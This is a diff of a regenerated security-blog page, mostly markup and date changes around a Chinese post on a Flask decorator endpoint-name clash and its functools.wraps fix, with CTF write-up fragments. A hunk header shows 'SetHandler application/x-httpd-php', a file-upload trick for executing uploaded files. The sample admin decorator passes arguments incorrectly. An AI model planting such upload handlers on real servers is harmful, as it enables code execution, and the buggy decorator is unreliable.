+                <time title="Modified: 2019-02-02 08:29:25" itemprop="dateModified" datetime="2019-02-02T08:29:25+08:00">2019-02-02</time>
               
             
           </span>
@@ -789,14 +789,14 @@
                 <span class="post-meta-item-text">In</span>
               
               
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/Ctf/" itemprop="url" rel="index"><span itemprop="name">Ctf</span></a></span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Ctf/" itemprop="url" rel="index"><span itemprop="name">Ctf</span></a></span>
 
                 
                 
                   , 
                 
               
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/Ctf/web/" itemprop="url" rel="index"><span itemprop="name">web</span></a></span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Ctf/web/" itemprop="url" rel="index"><span itemprop="name">web</span></a></span>
 
                 
                 
@@ -890,20 +890,20 @@
 
   
 
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
   
   
   
   <div class="post-block">
     <link itemprop="mainEntityOfPage" href="https://hexo.imagemlt.xyz/post/flask自定义decorator的坑点/index.html">
 
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Imagemlt">
       <meta itemprop="description" content="personal blog">
       <meta itemprop="image" content="https://avatars0.githubusercontent.com/u/26888704?s=460&v=4">
     </span>
 
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
       <meta itemprop="name" content="Image's blog">
     </span>
 
@@ -958,7 +958,7 @@
                 
                   <span class="post-meta-item-text">Edited on</span>
                 
-                <time title="Modified: 2019-07-06 23:27:08" itemprop="dateModified" datetime="2019-07-06T23:27:08+08:00">2019-07-06</time>
+                <time title="Modified: 2019-02-02 08:29:25" itemprop="dateModified" datetime="2019-02-02T08:29:25+08:00">2019-02-02</time>
               
             
           </span>
@@ -999,7 +999,7 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">existing endpoint function: %s&apos; % endpoint)</span><br><span class="line">AssertionError: View function mapping is overwriting an existing endpoint function: admin.wrapper</span><br></pre></td></tr></table></figure>
 <p>一开始的时候百思不得其解，并不懂这个错误出现的原因。后来联系报错的提示为已经存在了一个注册过的函数admin.wrapper.<br>可以判断为，经过修饰器修饰后，当传入flask自己的修饰器后修饰器获取到的当前函数的名称为wrapper，所以所有被这个修饰器修饰过得函数传入flask的修饰器中获取到的函数名都是wrapper，因此产生了冲突从而报错。</p>
 <p>查看报错的地方的源码，位于<em>app.py</em>中：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_url_rule</span><span class="params">(self, rule, endpoint=None, view_func=None,</span></span></span><br><span class="line"><span class="function"><span class="params">                 provide_automatic_options=None, **options)</span>:</span></span><br><span class="line">    <span class="string">"""Connects a URL rule.  Works exactly like the :meth:`route`</span></span><br><span class="line"><span class="string">    decorator.  If a view_func is provided it will be registered with the</span></span><br><span class="line"><span class="string">    endpoint.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Basically this example::</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        @app.route('/')</span></span><br><span class="line"><span class="string">        def index():</span></span><br><span class="line"><span class="string">            pass</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Is equivalent to the following::</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        def index():</span></span><br><span class="line"><span class="string">            pass</span></span><br><span class="line"><span class="string">        app.add_url_rule('/', 'index', index)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    If the view_func is not provided you will need to connect the endpoint</span></span><br><span class="line"><span class="string">    to a view function like so::</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        app.view_functions['index'] = index</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Internally :meth:`route` invokes :meth:`add_url_rule` so if you want</span></span><br><span class="line"><span class="string">    to customize the behavior via subclassing you only need to change</span></span><br><span class="line"><span class="string">    this method.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    For more information refer to :ref:`url-route-registrations`.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    .. versionchanged:: 0.2</span></span><br><span class="line"><span class="string">       `view_func` parameter added.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    .. versionchanged:: 0.6</span></span><br><span class="line"><span class="string">       ``OPTIONS`` is added automatically as method.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    :param rule: the URL rule as string</span></span><br><span class="line"><span class="string">    :param endpoint: the endpoint for the registered URL rule.  Flask</span></span><br><span class="line"><span class="string">                     itself assumes the name of the view function as</span></span><br><span class="line"><span class="string">                     endpoint</span></span><br><span class="line"><span class="string">    :param view_func: the function to call when serving a request to the</span></span><br><span class="line"><span class="string">                      provided endpoint</span></span><br><span class="line"><span class="string">    :param provide_automatic_options: controls whether the ``OPTIONS``</span></span><br><span class="line"><span class="string">        method should be added automatically. This can also be controlled</span></span><br><span class="line"><span class="string">        by setting the ``view_func.provide_automatic_options = False``</span></span><br><span class="line"><span class="string">        before adding the rule.</span></span><br><span class="line"><span class="string">    :param options: the options to be forwarded to the underlying</span></span><br><span class="line"><span class="string">                    :class:`~werkzeug.routing.Rule` object.  A change</span></span><br><span class="line"><span class="string">                    to Werkzeug is handling of method options.  methods</span></span><br><span class="line"><span class="string">                    is a list of methods this rule should be limited</span></span><br><span class="line"><span class="string">                    to (``GET``, ``POST`` etc.).  By default a rule</span></span><br><span class="line"><span class="string">                    just listens for ``GET`` (and implicitly ``HEAD``).</span></span><br><span class="line"><span class="string">                    Starting with Flask 0.6, ``OPTIONS`` is implicitly</span></span><br><span class="line"><span class="string">                    added and handled by the standard request handling.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">if</span> endpoint <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">        endpoint = _endpoint_from_view_func(view_func)</span><br><span class="line">    options[<span class="string">'endpoint'</span>] = endpoint</span><br><span class="line">    methods = options.pop(<span class="string">'methods'</span>, <span class="keyword">None</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># if the methods are not given and the view_func object knows its</span></span><br><span class="line">    <span class="comment"># methods we can use that instead.  If neither exists, we go with</span></span><br><span class="line">    <span class="comment"># a tuple of only ``GET`` as default.</span></span><br><span class="line">    <span class="keyword">if</span> methods <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">        methods = getattr(view_func, <span class="string">'methods'</span>, <span class="keyword">None</span>) <span class="keyword">or</span> (<span class="string">'GET'</span>,)</span><br><span class="line">    <span class="keyword">if</span> isinstance(methods, string_types):</span><br><span class="line">        <span class="keyword">raise</span> TypeError(<span class="string">'Allowed methods have to be iterables of strings, '</span></span><br><span class="line">                        <span class="string">'for example: @app.route(..., methods=["POST"])'</span>)</span><br><span class="line">    methods = set(item.upper() <span class="keyword">for</span> item <span class="keyword">in</span> methods)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Methods that should always be added</span></span><br><span class="line">    required_methods = set(getattr(view_func, <span class="string">'required_methods'</span>, ()))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># starting with Flask 0.8 the view_func object can disable and</span></span><br><span class="line">    <span class="comment"># force-enable the automatic options handling.</span></span><br><span class="line">    <span class="keyword">if</span> provide_automatic_options <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">        provide_automatic_options = getattr(view_func,</span><br><span class="line">            <span class="string">'provide_automatic_options'</span>, <span class="keyword">None</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> provide_automatic_options <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'OPTIONS'</span> <span class="keyword">not</span> <span class="keyword">in</span> methods:</span><br><span class="line">            provide_automatic_options = <span class="keyword">True</span></span><br><span class="line">            required_methods.add(<span class="string">'OPTIONS'</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            provide_automatic_options = <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Add the required methods now.</span></span><br><span class="line">    methods |= required_methods</span><br><span class="line"></span><br><span class="line">    rule = self.url_rule_class(rule, methods=methods, **options)</span><br><span class="line">    rule.provide_automatic_options = provide_automatic_options</span><br><span class="line"></span><br><span class="line">    self.url_map.add(rule)</span><br><span class="line">    <span class="keyword">if</span> view_func <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</span><br><span class="line">        old_func = self.view_functions.get(endpoint)</span><br><span class="line">        <span class="keyword">if</span> old_func <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span> <span class="keyword">and</span> old_func != view_func:</span><br><span class="line">            <span class="keyword">raise</span> AssertionError(<span class="string">'View function mapping is overwriting an '</span></span><br><span class="line">                                 <span class="string">'existing endpoint function: %s'</span> % endpoint)</span><br><span class="line">        self.view_functions[endpoint] = view_func</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_url_rule</span><span class="params">(self, rule, endpoint=None, view_func=None,</span></span></span><br><span class="line"><span class="function"><span class="params">                 provide_automatic_options=None, **options)</span>:</span></span><br><span class="line">    <span class="string">"""Connects a URL rule.  Works exactly like the :meth:`route`</span></span><br><span class="line"><span class="string">    decorator.  If a view_func is provided it will be registered with the</span></span><br><span class="line"><span class="string">    endpoint.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Basically this example::</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        @app.route('/')</span></span><br><span class="line"><span class="string">        def index():</span></span><br><span class="line"><span class="string">            pass</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Is equivalent to the following::</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        def index():</span></span><br><span class="line"><span class="string">            pass</span></span><br><span class="line"><span class="string">        app.add_url_rule('/', 'index', index)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    If the view_func is not provided you will need to connect the endpoint</span></span><br><span class="line"><span class="string">    to a view function like so::</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        app.view_functions['index'] = index</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Internally :meth:`route` invokes :meth:`add_url_rule` so if you want</span></span><br><span class="line"><span class="string">    to customize the behavior via subclassing you only need to change</span></span><br><span class="line"><span class="string">    this method.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    For more information refer to :ref:`url-route-registrations`.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    .. versionchanged:: 0.2</span></span><br><span class="line"><span class="string">       `view_func` parameter added.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    .. versionchanged:: 0.6</span></span><br><span class="line"><span class="string">       ``OPTIONS`` is added automatically as method.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    :param rule: the URL rule as string</span></span><br><span class="line"><span class="string">    :param endpoint: the endpoint for the registered URL rule.  Flask</span></span><br><span class="line"><span class="string">                     itself assumes the name of the view function as</span></span><br><span class="line"><span class="string">                     endpoint</span></span><br><span class="line"><span class="string">    :param view_func: the function to call when serving a request to the</span></span><br><span class="line"><span class="string">                      provided endpoint</span></span><br><span class="line"><span class="string">    :param provide_automatic_options: controls whether the ``OPTIONS``</span></span><br><span class="line"><span class="string">        method should be added automatically. This can also be controlled</span></span><br><span class="line"><span class="string">        by setting the ``view_func.provide_automatic_options = False``</span></span><br><span class="line"><span class="string">        before adding the rule.</span></span><br><span class="line"><span class="string">    :param options: the options to be forwarded to the underlying</span></span><br><span class="line"><span class="string">                    :class:`~werkzeug.routing.Rule` object.  A change</span></span><br><span class="line"><span class="string">                    to Werkzeug is handling of method options.  methods</span></span><br><span class="line"><span class="string">                    is a list of methods this rule should be limited</span></span><br><span class="line"><span class="string">                    to (``GET``, ``POST`` etc.).  By default a rule</span></span><br><span class="line"><span class="string">                    just listens for ``GET`` (and implicitly ``HEAD``).</span></span><br><span class="line"><span class="string">                    Starting with Flask 0.6, ``OPTIONS`` is implicitly</span></span><br><span class="line"><span class="string">                    added and handled by the standard request handling.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">if</span> endpoint <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        endpoint = _endpoint_from_view_func(view_func)</span><br><span class="line">    options[<span class="string">'endpoint'</span>] = endpoint</span><br><span class="line">    methods = options.pop(<span class="string">'methods'</span>, <span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># if the methods are not given and the view_func object knows its</span></span><br><span class="line">    <span class="comment"># methods we can use that instead.  If neither exists, we go with</span></span><br><span class="line">    <span class="comment"># a tuple of only ``GET`` as default.</span></span><br><span class="line">    <span class="keyword">if</span> methods <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        methods = getattr(view_func, <span class="string">'methods'</span>, <span class="literal">None</span>) <span class="keyword">or</span> (<span class="string">'GET'</span>,)</span><br><span class="line">    <span class="keyword">if</span> isinstance(methods, string_types):</span><br><span class="line">        <span class="keyword">raise</span> TypeError(<span class="string">'Allowed methods have to be iterables of strings, '</span></span><br><span class="line">                        <span class="string">'for example: @app.route(..., methods=["POST"])'</span>)</span><br><span class="line">    methods = set(item.upper() <span class="keyword">for</span> item <span class="keyword">in</span> methods)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Methods that should always be added</span></span><br><span class="line">    required_methods = set(getattr(view_func, <span class="string">'required_methods'</span>, ()))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># starting with Flask 0.8 the view_func object can disable and</span></span><br><span class="line">    <span class="comment"># force-enable the automatic options handling.</span></span><br><span class="line">    <span class="keyword">if</span> provide_automatic_options <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        provide_automatic_options = getattr(view_func,</span><br><span class="line">            <span class="string">'provide_automatic_options'</span>, <span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> provide_automatic_options <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'OPTIONS'</span> <span class="keyword">not</span> <span class="keyword">in</span> methods:</span><br><span class="line">            provide_automatic_options = <span class="literal">True</span></span><br><span class="line">            required_methods.add(<span class="string">'OPTIONS'</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            provide_automatic_options = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Add the required methods now.</span></span><br><span class="line">    methods |= required_methods</span><br><span class="line"></span><br><span class="line">    rule = self.url_rule_class(rule, methods=methods, **options)</span><br><span class="line">    rule.provide_automatic_options = provide_automatic_options</span><br><span class="line"></span><br><span class="line">    self.url_map.add(rule)</span><br><span class="line">    <span class="keyword">if</span> view_func <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        old_func = self.view_functions.get(endpoint)</span><br><span class="line">        <span class="keyword">if</span> old_func <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> old_func != view_func:</span><br><span class="line">            <span class="keyword">raise</span> AssertionError(<span class="string">'View function mapping is overwriting an '</span></span><br><span class="line">                                 <span class="string">'existing endpoint function: %s'</span> % endpoint)</span><br><span class="line">        self.view_functions[endpoint] = view_func</span><br></pre></td></tr></table></figure>
 <p>这里的view_functions是一个dict，存储endpoint-view_func键值对。而endpoint是指一个标记各个url的一个字符串，通常为函数的名称。endpoint与不同的函数一一对应。<br>出错的原因在于相同的endpoint被指向了两次，且指向的函数不同，但是这两个不同的函数却拥有相同的名字<strong><strong>name</strong></strong>，因此便对应了相同的endpoint。所以便导致了重复出现的错误。</p>
 <p>那么怎么解决这个问题？这里使用了一个叫做functools的库中定义的一个修饰器@functool.wraps.<br>更改后的代码为:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_admin</span><span class="params">(func)</span>:</span></span><br><span class="line"><span class="meta">    @functools.wraps(func)</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span><span class="params">(*args,**kargs)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> session[<span class="string">'is_admin'</span>]:</span><br><span class="line">            <span class="keyword">return</span> redirect(<span class="string">'/admin/login'</span>)</span><br><span class="line">        <span class="keyword">return</span> func(args,kargs)</span><br><span class="line">    <span class="keyword">return</span> wrapper</span><br></pre></td></tr></table></figure></p>
 <p>再次调试可以看到这次程序运行后对应的函数的<strong>name</strong>不同，从而没有再出现bug。再次调试可以发现最后的函数的<strong>name</strong>与对应的endpoint值均不同。</p>
@@ -1054,20 +1054,20 @@
 
   
 
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
   
   
   
   <div class="post-block">
     <link itemprop="mainEntityOfPage" href="https://hexo.imagemlt.xyz/post/红帽杯线下赛AWD题目分析/index.html">
 
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Imagemlt">
       <meta itemprop="description" content="personal blog">
       <meta itemprop="image" content="https://avatars0.githubusercontent.com/u/26888704?s=460&v=4">
     </span>
 
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
       <meta itemprop="name" content="Image's blog">
     </span>
 
@@ -1122,7 +1122,7 @@
                 
                   <span class="post-meta-item-text">Edited on</span>
                 
-                <time title="Modified: 2019-07-06 23:27:08" itemprop="dateModified" datetime="2019-07-06T23:27:08+08:00">2019-07-06</time>
+                <time title="Modified: 2019-02-02 08:29:25" itemprop="dateModified" datetime="2019-02-02T08:29:25+08:00">2019-02-02</time>
               
             
           </span>
@@ -1139,14 +1139,14 @@
                 <span class="post-meta-item-text">In</span>
               
               
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/Ctf/" itemprop="url" rel="index"><span itemprop="name">Ctf</span></a></span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Ctf/" itemprop="url" rel="index"><span itemprop="name">Ctf</span></a></span>
 
                 
                 
                   , 
                 
               
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/Ctf/web/" itemprop="url" rel="index"><span itemprop="name">web</span></a></span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Ctf/web/" itemprop="url" rel="index"><span itemprop="name">web</span></a></span>
 
                 
                 
@@ -1281,20 +1281,20 @@
 
   
 
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
   
   
   
   <div class="post-block">
     <link itemprop="mainEntityOfPage" href="https://hexo.imagemlt.xyz/post/wmj-2/index.html">
 
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Imagemlt">
       <meta itemprop="description" content="personal blog">
       <meta itemprop="image" content="https://avatars0.githubusercontent.com/u/26888704?s=460&v=4">
     </span>
 
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
       <meta itemprop="name" content="Image's blog">
     </span>
 
@@ -1349,7 +1349,7 @@
                 
                   <span class="post-meta-item-text">Edited on</span>
                 
-                <time title="Modified: 2019-07-06 23:27:08" itemprop="dateModified" datetime="2019-07-06T23:27:08+08:00">2019-07-06</time>
+                <time title="Modified: 2019-02-02 08:29:25" itemprop="dateModified" datetime="2019-02-02T08:29:25+08:00">2019-02-02</time>
               
             
           </span>
@@ -1366,7 +1366,7 @@
                 <span class="post-meta-item-text">In</span>
               
               
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/人生杂谈/" itemprop="url" rel="index"><span itemprop="name">人生杂谈</span></a></span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/人生杂谈/" itemprop="url" rel="index"><span itemprop="name">人生杂谈</span></a></span>
 
                 
                 
@@ -1451,20 +1451,20 @@
 
   
 
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
   
   
   
   <div class="post-block">
     <link itemprop="mainEntityOfPage" href="https://hexo.imagemlt.xyz/post/file-upload-attacks/index.html">
 
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Imagemlt">
       <meta itemprop="description" content="personal blog">
       <meta itemprop="image" content="https://avatars0.githubusercontent.com/u/26888704?s=460&v=4">
     </span>
 
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
       <meta itemprop="name" content="Image's blog">
     </span>
 
@@ -1519,7 +1519,7 @@
                 
                   <span class="post-meta-item-text">Edited on</span>
                 
-                <time title="Modified: 2019-07-06 23:27:08" itemprop="dateModified" datetime="2019-07-06T23:27:08+08:00">2019-07-06</time>
+                <time title="Modified: 2019-02-02 08:29:25" itemprop="dateModified" datetime="2019-02-02T08:29:25+08:00">2019-02-02</time>
               
             
           </span>
@@ -1536,7 +1536,7 @@
                 <span class="post-meta-item-text">In</span>
               
               
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/人生杂谈/" itemprop="url" rel="index"><span itemprop="name">人生杂谈</span></a></span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/人生杂谈/" itemprop="url" rel="index"><span itemprop="name">人生杂谈</span></a></span>
 
                 
                 
@@ -1669,20 +1669,20 @@ SetHandler application/x-httpd-php
 
   
 
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
   
   
   
   <div class="post-block">
     <link itemprop="mainEntityOfPage" href="https://hexo.imagemlt.xyz/post/ddctf-writeup/index.html">
 
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Imagemlt">
       <meta itemprop="description" content="personal blog">
       <meta itemprop="image" content="https://avatars0.githubusercontent.com/u/26888704?s=460&v=4">
     </span>
 
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
       <meta itemprop="name" content="Image's blog">
     </span>
 
@@ -1737,7 +1737,7 @@ SetHandler application/x-httpd-php
                 
                   <span class="post-meta-item-text">Edited on</span>
                 
-                <time title="Modified: 2019-07-06 23:27:08" itemprop="dateModified" datetime="2019-07-06T23:27:08+08:00">2019-07-06</time>
+                <time title="Modified: 2019-02-02 08:29:25" itemprop="dateModified" datetime="2019-02-02T08:29:25+08:00">2019-02-02</time>
               
             
           </span>
@@ -1754,7 +1754,7 @@ SetHandler application/x-httpd-php
                 <span class="post-meta-item-text">In</span>
               
               
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/人生杂谈/" itemprop="url" rel="index"><span itemprop="name">人生杂谈</span></a></span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/人生杂谈/" itemprop="url" rel="index"><span itemprop="name">人生杂谈</span></a></span>
 
                 
                 
@@ -1795,7 +1795,7 @@ SetHandler application/x-httpd-php
 <h2 id="第四扩展fs"><a href="#第四扩展fs" class="headerlink" title="第四扩展fs"></a>第四扩展fs</h2><p>binwalk 可从图片中获得一个压缩包，图片右击属性里面详细信息-备注可获得压缩包密码为Pactera,解压压缩包后获得一个文本文件,复制内容进行字频统计即可获得flag<a href="http://www.aihanyu.org/cncorpus/CpsTongji.aspx">在线字词频率统计</a> <img src="http://p7lc13qga.bkt.clouddn.com/misc2.PNG" alt="misc2"></p>
